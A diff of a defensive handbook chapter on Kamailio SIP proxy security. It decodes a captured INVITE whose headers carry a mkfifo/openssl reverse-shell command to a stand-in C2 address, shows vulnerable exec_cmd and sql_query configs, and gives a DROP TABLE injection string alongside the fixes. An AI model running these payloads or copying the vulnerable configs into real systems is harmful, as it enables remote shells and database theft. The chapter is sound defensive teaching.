@@ -1,19 +1,17 @@
 # 9.4 Fuzzing, and a command-injection → reverse-shell case study
 
 > [!IMPORTANT]
-> This chapter is built on a real captured attack: an `INVITE` with `$(...)` shell constructs planted in its `User-Agent` and `Call-ID`, aiming to open a reverse shell back to the attacker. The question the handbook cares about is not "what does that payload do" — it's the internals question: **is *Kamailio* the vulnerable component here?** The answer is almost never. A vanilla proxy forwards those bytes and never executes them. But there is exactly one place where Kamailio *is* the vuln, and a handful of places downstream where its data lights the fuse — and this chapter shows precisely where.
+> Built on a real captured attack: an `INVITE` with `$(...)` shell constructs in its `User-Agent` and `Call-ID`, aiming to open a reverse shell. The handbook's question isn't what the payload does — it's **is *Kamailio* the vulnerable component?** Almost never: a vanilla proxy forwards those bytes and never executes them. But there are a couple of places where Kamailio *is* the vuln — a config that shells out, or one that builds SQL from request data — and several more downstream where its data lights the fuse. This chapter shows precisely where.
 
 ## Fuzzing the parser
 
-The first thing an attacker probes is the parser itself, because it is hand-written C operating on raw network bytes ([3.2 the parsed message](08-parsed-message.md)). Kamailio's first-pass parse walks the header section registering name and byte-range per header, and parses values lazily on first access — fast, but a large attack surface of pointer arithmetic over attacker-controlled input. The bug class fuzzing hunts for here is the classic one for byte-span parsers: the over-read or the off-by-one on a truncated, oversized, or pathologically nested header that walks a pointer past the end of the receive buffer, or a length field that disagrees with the bytes behind it.
+The parser is the first target: hand-written C walking raw network bytes ([3.2 the parsed message](08-parsed-message.md)), registering header name/value spans on the first pass and parsing values lazily — fast, but a wide surface of pointer arithmetic over attacker input. The bug class is the byte-span classic: an over-read or off-by-one on a truncated, oversized, or pathologically nested header that walks past the receive buffer, or a length field disagreeing with the bytes behind it.
 
-The tooling for this is mature and worth naming. `SIPp` drives malformed and edge-case scenarios from hand-written XML — it is the standard way to replay a deliberately broken message at a target. The **PROTOS SIP test suite** (from Oulu University's OUSPG) is the canonical corpus of malformed `INVITE`s that shook out parser bugs across the entire SIP industry years ago. And coverage-guided fuzzers — **AFL**/AFL++ — can be pointed at the parser entry points directly to mutate toward new crashes. None of this is hypothetical; it is the standard fuzzing kit. (No CVE is cited here on purpose: the *class* of bug is the point, not any specific patched instance.)
-
-`sanity` ([9.2](37-security-modules.md)) is a partial backstop and nothing more. Called first in `request_route`, it rejects messages that fail structural checks — a missing required header, a `Content-Length` that lies about the body — and kills a lot of crude malformed junk before the rest of the parser runs on it. But it runs *after* the first-pass parse, it checks form not safety, and it cannot anticipate the parser bug fuzzing is looking for. Treat it as triage, not armour. The real defence against the parser-crash class is a patched, current Kamailio.
+The kit is mature: `SIPp` replays malformed scenarios from hand-written XML; the **PROTOS SIP suite** (Oulu University's OUSPG) is the canonical malformed-`INVITE` corpus that shook out parser bugs industry-wide; coverage-guided fuzzers (**AFL**/AFL++) mutate against the parser entry points. (No CVE cited on purpose — the *class* is the point, not a patched instance.) `sanity` ([9.2](37-security-modules.md)) is triage, not armour: it runs *after* the first-pass parse and checks form, not the memory-safety bug fuzzing hunts. The real defence against the crash class is a patched, current Kamailio.
 
 ## The captured payload
 
-The interesting payload in the capture is not a malformed message at all. It is a perfectly well-formed `INVITE` — it parses cleanly, it passes `sanity` — carrying its weapon in plain header text:
+The interesting payload isn't malformed at all — a clean `INVITE` that parses and passes `sanity`, carrying its weapon in plain header text:
 
 ```
 INVITE sip:00XXXXXXXXXX@sip.example.net SIP/2.0
@@ -29,61 +27,76 @@ Content-Type: application/sdp
 Content-Length: 0
 ```
 
-Decode the substituted command precisely, because every token earns its place:
+Decode the substituted command — every token earns its place:
 
-- `mkfifo /tmp/s` — creates a named pipe (FIFO) on disk.
-- `/bin/sh -i < /tmp/s 2>&1` — starts an interactive shell reading its commands *from* the FIFO, with stderr folded into stdout.
-- `| openssl s_client -quiet -connect 203.0.113.10:443` — pipes the shell's output into a TLS client connected to the attacker's C2 at `203.0.113.10:443`. The attacker writes commands back down the same TLS socket into the FIFO, closing the loop. Going over `:443` with `openssl s_client` is deliberate: the traffic looks like an ordinary outbound HTTPS connection and slides past naive egress filtering that only allows "web" out.
-- `> /tmp/s` — wires the TLS client's received data back into the FIFO, so attacker keystrokes reach the shell's stdin.
-- `rm /tmp/s` — removes the pipe afterward to clean up the evidence.
+- `mkfifo /tmp/s` — a named pipe (FIFO) on disk.
+- `/bin/sh -i < /tmp/s 2>&1` — an interactive shell reading commands *from* the FIFO, stderr folded into stdout.
+- `| openssl s_client -quiet -connect 203.0.113.10:443` — pipes the shell's output into a TLS client to the attacker's C2 at `203.0.113.10:443`; over `:443` with `openssl s_client` it looks like ordinary outbound HTTPS and slides past naive egress filtering.
+- `> /tmp/s` — feeds the TLS client's received bytes back into the FIFO, so attacker keystrokes reach the shell's stdin, closing the loop.
+- `rm /tmp/s` — removes the pipe to clean up.
 
-The rest of the message is decoration. `From`, `To`, the `Contact`, the empty SDP — all chosen so the packet reads as a mundane call attempt and draws no attention. Note that the *same* `$(...)` construct appears in both `Call-ID` and `User-Agent`: the attacker is spraying the substitution into multiple header values on the bet that *some* downstream consumer reads one of them into a shell. They do not know your config; they are seeding several fields and hoping one lands.
+The rest is decoration so the packet reads as a mundane call. The *same* `$(...)` sits in both `Call-ID` and `User-Agent`: not knowing your config, the attacker sprays the substitution across fields, betting *some* downstream consumer reads one into a shell.
 
-## Why a vanilla Kamailio proxy is not vulnerable
+## Why a vanilla proxy is not vulnerable
 
-Now the load-bearing point. Run this through a plain relay and **nothing executes.**
-
-When the parser handles that `User-Agent`, it does exactly what [3.2](08-parsed-message.md) describes: it records the header's name and a `(pointer, length)` byte span into the original receive buffer. The value `$(mkfifo …)` is stored as *bytes* — a `str` pointing at offsets inside `msg->buf`. The core does not interpret it, expand it, or evaluate it. There is no shell anywhere in the parse path, the routing engine, or message forwarding. `$(...)` is shell syntax; the SIP core has no shell.
-
-When the proxy forwards the request, the value rides along unchanged. Forwarding works through the lump system ([3.3 lumps](09-lumps.md)): the buffer is never edited in place, the outbound message is reassembled from the original bytes plus add/remove lumps, and a header you do not touch is copied verbatim. So `User-Agent: $(mkfifo …)` leaves your proxy exactly as it arrived — forwarded as a literal string, never once handed to `/bin/sh`. A SIP proxy that only routes, authenticates, and relays has no code path that turns a header value into a process. The payload is inert. This is the default, and it is the common case.
+Run it through a plain relay and **nothing executes.** The parser does what [3.2](08-parsed-message.md) describes — records the header's name and a `(pointer, length)` byte span into the receive buffer. `$(mkfifo …)` is stored as *bytes*, a `str` into `msg->buf`; the core never interprets, expands, or evaluates it. There is no shell in the parse path, the routing engine, or forwarding. On forward, the value rides along through the lump system ([3.3 lumps](09-lumps.md)) — the buffer is never edited in place, untouched headers are copied verbatim — so `User-Agent: $(mkfifo …)` leaves exactly as it arrived, never handed to `/bin/sh`. A proxy that routes, authenticates, and relays has no code path that turns a header value into a process. The payload is inert. That is the default and the common case.
 
 ## When it DOES fire
 
-The payload only becomes a reverse shell when something on your side feeds that header value into a shell. There are three sinks, in rough order of how directly Kamailio is implicated.
+The payload becomes a reverse shell only when something on your side feeds the header value into a shell. Three sinks, in order of how directly Kamailio is implicated:
 
-**1. The `exec` module — the one in-core footgun.** The [`exec`](https://kamailio.org/docs/modules/devel/modules/exec.html) module shells out by design. Its functions — `exec_cmd()`, `exec_msg()`, `exec_avp()`, `exec_dset()` — run their command string through the shell (the module uses `popen()`), and the command string **may contain pseudo-variables**, which are interpolated before execution. That is the whole danger in one sentence: if you interpolate an attacker-controlled SIP field into an `exec` command, you have built a remote shell.
+**1. The `exec` module — the one in-core footgun.** [`exec`](https://kamailio.org/docs/modules/devel/modules/exec.html) shells out by design: `exec_cmd()`/`exec_msg()`/`exec_avp()`/`exec_dset()` run their command string through `popen()`, and that string **may contain pseudo-variables**, interpolated before execution. Interpolate an attacker-controlled field and you've built a remote shell:
 
 ```
 # VULNERABLE — $ua is the raw User-Agent; $(...) is interpolated and run by the shell
 exec_cmd("echo $ua >> /var/log/agents.log");
 ```
 
-With the captured payload, `$ua` expands to `$(mkfifo …)`, the shell performs *its own* command substitution on that, and the reverse shell opens. The module's own documentation is blunt about this: "if the exec functions are passed variables that might include malicious input, then remote attackers may abuse the exec functions to execute arbitrary code … this may result in OS command injection," and it states that "input validation is required to prevent the vulnerability." The safe form never lets the value reach a shell metacharacter unquoted:
+`$ua` expands to `$(mkfifo …)`, the shell runs *its own* command substitution, the reverse shell opens. The module docs say it plainly: variables with malicious input "may result in OS command injection … input validation is required." The safe form validates then single-quotes:
 
 ```
-# SAFER — validate first, then single-quote so the shell treats it as one literal arg
+# SAFER — strict allowlist first, then single-quote as one literal arg
 if ($ua =~ "^[A-Za-z0-9 ._/-]+$") {
     exec_cmd("echo '$ua' >> /var/log/agents.log");
 }
 ```
 
-Better still: don't shell out with attacker data at all. (See the next section — quoting alone is fragile.)
+Better still, don't shell out with message data — quoting alone is fragile.
 
-**2. Shell-based capture or logging pipelines.** Kamailio isn't running the command, but its data flows into one that is. A common shape: a sidecar or operator script slurps fields out of Kamailio (via syslog, an `evapi`/`xhttp` hook, a tap like an sngrep-style capture export) and does something like `sh -c "lookup-ua.sh $UA"`. The shell is in the *script*, not Kamailio — but the taint originated in the `User-Agent` Kamailio happily forwarded, and the substitution fires in the script's shell.
+**2. Shell-based capture or logging pipelines.** Kamailio isn't running the command, but its data flows into one that is: a sidecar slurps fields (syslog, an `evapi`/`xhttp` hook, an sngrep-style capture export) and does `sh -c "lookup-ua.sh $UA"`. The shell is in the script; the taint came from the `User-Agent` Kamailio forwarded.
 
-**3. External CDR / analytics scripts.** The same mechanism, one hop further out. A billing or analytics job reads SIP fields — `From` user, `User-Agent`, `Call-ID` — out of CDRs or an accounting table and assembles a shell command from them (a `system()` call, a `sh -c`, a backtick in a Perl/Python wrapper). The attacker's `Call-ID` containing `$(...)` lands in the CDR exactly as captured, and detonates whenever that record is processed by something that builds a shell string from it.
+**3. External CDR / analytics scripts.** One hop further: a billing or analytics job reads `From`/`User-Agent`/`Call-ID` out of CDRs and assembles a shell command (a `system()`, a backtick in a Perl/Python wrapper). The attacker's `Call-ID` `$(...)` landed in the CDR verbatim and detonates whenever something builds a shell string from it.
 
-The unifying lesson ties straight back to [9.2](37-security-modules.md): **the taint reads as trusted because it survived parsing and `sanity`.** But `sanity` only ever validated *SIP syntax* — `$(...)` is legal SIP token content, so it passed untouched — and it said nothing, because it can say nothing, about *shell* safety. A value being well-formed SIP is not a statement about what a shell will do with it. Every sink above makes the same wrong assumption: that surviving the SIP layer means the bytes are safe to hand to a different interpreter.
+## The same taint, a SQL sink
+
+Swap the interpreter and the bug survives. Kamailio is usually DB-backed — `auth_db`, `usrloc`, `dialplan`, `permissions`, `lcr` — and several modules build SQL from SIP-derived values. The *parameterized* paths are safe: configure `auth_db` with column names and the DBAPI escapes each value through the driver before it reaches the server. The exposed path is *string-building* — `sqlops`' `sql_query()` and `avpops`' `avp_db_query()` — where you compose the query text yourself and pseudo-variables are interpolated verbatim:
+
+```
+# VULNERABLE — $fU is the From-URI user, taken straight from the request
+sql_query("ca", "SELECT plan FROM subscriber WHERE username='$fU'", "ra");
+```
+
+`$fU` is attacker-controlled — URI text the parser stored as bytes, exactly like the `User-Agent` above — and `sanity` passed it because it is legal SIP. A `From` user of `x';DROP TABLE subscriber;--` closes the quote and appends a statement; the same path exfiltrates the `subscriber` table's `ha1` password hashes by union/boolean. The fix mirrors the `exec` rule — escape at the boundary with the SQL transformation `{s.escape.common}`:
+
+```
+# SAFE — {s.escape.common} escapes quotes/specials for SQL
+sql_query("ca", "SELECT plan FROM subscriber WHERE username='$(fU{s.escape.common})'", "ra");
+```
+
+`secf_check_sqli_all()` ([9.2](37-security-modules.md)) only swats the obvious probes; the real defence is escaping every interpolated value at the query, or staying on the parameterized module API that escapes for you.
+
+The unifying lesson ties to [9.2](37-security-modules.md): **the taint reads as trusted because it survived parsing and `sanity`** — but `sanity` validated only *SIP syntax*, and `$(...)` and `'` are legal SIP token content. Well-formed SIP says nothing about what a *shell* or a *database* will do with the bytes. Every sink makes the same wrong assumption: that surviving the SIP layer means the bytes are safe to hand to a different interpreter.
 
 ## How to avoid it
 
-The rule is short: **never pass a SIP-derived string to a shell.**
+**Never pass a SIP-derived string to another interpreter.**
 
-- **Don't shell out with message data.** If you only need to log or count, use Kamailio's own logging/accounting, not `exec`. The cheapest fix is to not have a shell in the path at all.
-- **If `exec` is unavoidable, kill the shell interpolation, don't just escape it.** Prefer an argument-vector design — a helper that takes the value as a positional argument the OS hands across without a shell — over building one `sh -c "…$pv…"` string. If you must interpolate, single-quote *and* validate against a strict allowlist regex first (as above); a blocklist of "bad characters" will lose to an encoding you didn't think of.
-- **Filter content with `secfilter`.** `secf_check_ua()` and `secf_check_sqli_all()` ([9.2](37-security-modules.md)) can reject a `User-Agent` carrying obvious metacharacters before it reaches any sink. This raises the cost of the naive payload; it is not a substitute for fixing the sink.
-- **Do not expect `sanity` to help.** It validates form; this attack is well-formed. Counting on `sanity` here is the exact mistake the chapter is about.
-- **Defence in depth around the edge.** These payloads ride in on quiet scanners — the ones already in the reputation feeds. `pike` + the `ipban` `htable` + apiban ([9.3](38-security-blocklists.md)) keep most of them from reaching your route at all. `topoh` ([8.1 topology hiding](19-topos.md)) starves the recon that precedes a targeted attempt. And `fail2ban` on your logs catches the source after the first probe shows up. None of these fixes the sink — but together they ensure most of this traffic never gets the chance to test it.
+- **Don't shell out with message data.** To log or count, use Kamailio's own logging/accounting, not `exec`. The cheapest fix is no shell in the path.
+- **If `exec` is unavoidable, kill the interpolation, don't just escape it.** Prefer an argument-vector helper — the value passed as a positional argument the OS hands across without a shell — over building a `sh -c "…$pv…"` string. If you must interpolate, single-quote *and* validate against a strict allowlist; a bad-character blocklist loses to an encoding you missed.
+- **Escape SQL built from SIP values.** With `sqlops`/`avpops`, wrap every interpolated pseudo-variable in `{s.escape.common}`, or stay on the parameterized module API (e.g. `auth_db` column config) that escapes through the driver — never drop `$fU`/`$tU` into a query string raw.
+- **Filter content with `secfilter`.** `secf_check_ua()` and `secf_check_sqli_all()` ([9.2](37-security-modules.md)) reject obvious metacharacters before any sink — raising the cost of the naive payload, not substituting for fixing the sink.
+- **Don't expect `sanity` to help.** It validates form; this attack is well-formed. Counting on it here is the exact mistake the chapter is about.
+- **Defence in depth at the edge.** These ride in on quiet scanners already in the reputation feeds: `pike` + the `ipban` `htable` + apiban ([9.3](38-security-blocklists.md)) keep most from reaching your route, `topoh` ([8.1 topology hiding](19-topos.md)) starves the recon, and `fail2ban` catches the source after the first probe. None fixes the sink — together they keep most of this traffic from getting to test it.
 
 ## The two paths
 
@@ -113,9 +126,9 @@ flowchart TB
     class RS bad
 ```
 
-The fork is the whole chapter: identical bytes, identical parse, identical `sanity` verdict — and the only thing that decides "inert string" versus "reverse shell" is whether *you* put a shell on the path.
+The fork is the whole chapter: identical bytes, identical parse, identical `sanity` verdict — the only thing deciding "inert string" versus "reverse shell" is whether *you* put another interpreter on the path.
 
-Which is the note Part 9 closes on. Kamailio's security posture is overwhelmingly about **what you wire around it** — the cheap edge filters of [9.2](37-security-modules.md), the reputation and ban state of [9.3](38-security-blocklists.md), the auth boundary that turns an anonymous datagram into a known identity. The core treats hostile bytes as data and forwards them as data. The one genuine in-core footgun is `exec` with an unescaped pseudo-variable — and it is entirely avoidable: keep SIP-derived strings away from shells, and the captured payload stays the inert text the parser always thought it was.
+Which is the note Part 9 closes on. Kamailio's security posture is overwhelmingly about **what you wire around it** — the cheap edge filters of [9.2](37-security-modules.md), the reputation and ban state of [9.3](38-security-blocklists.md), the auth boundary that turns an anonymous datagram into a known identity. The core treats hostile bytes as data and forwards them as data. The genuine in-core footguns are narrow and avoidable: `exec` with an unescaped pseudo-variable, and a raw `sql_query`/`avp_db_query` that interpolates one — keep SIP-derived strings away from shells and out of hand-built query strings, and the captured payload stays the inert text the parser always thought it was.
 
 ---
 
